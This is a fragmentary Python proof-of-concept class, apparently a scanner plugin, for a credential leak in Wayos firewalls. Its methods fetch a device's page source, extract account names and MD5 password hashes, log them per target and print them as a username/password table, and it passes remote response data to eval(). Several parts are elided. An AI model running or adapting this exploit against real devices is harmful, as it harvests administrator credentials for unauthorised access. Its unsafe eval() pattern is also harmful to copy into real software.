...
class POC:
    vulnName = "Wayos_passLeaked"
    vulnNameZh = "Wayos 防火墙账号密码泄露漏洞"
    vulnDescribe = "Wayos 防火墙账号及密码MD5值泄露在源码中，解密即可登录系统"
    vulnNumber = "--"
    vulnTime = "--"
    vulnVersion = "--"
    vulnPath = "view-source:http://..."
    ...
    def exploitVuln(self, url):
        ...
        try:
            ...
            return "Conn"
        try:
            userData = rep.text[rep.text.find("["):rep.text.find("]") + 1]
            return userData
        except:
            return "Safe"
    ...
    def verify(self, url):
        ...
        if "password" in repData:
            ...
            if self.args.file:
                ...
                try:
                    self.findCount += 1
                    for i in eval(repData):
                        self.vulnRULList.append([url, i["name"], i["password"]])
                finally:
                    self.lock.release()
        elif "Conn" == repData:
    ...
    def attack(self):
        ...
        userList = eval(repData)
        print(f"\n{'userName'.ljust(15)}|{'passWord'}\n{'-' * 50}")
        for i in userList:
            print(f"{i['name'].ljust(15)}|{i['password']}")
        print("\n")
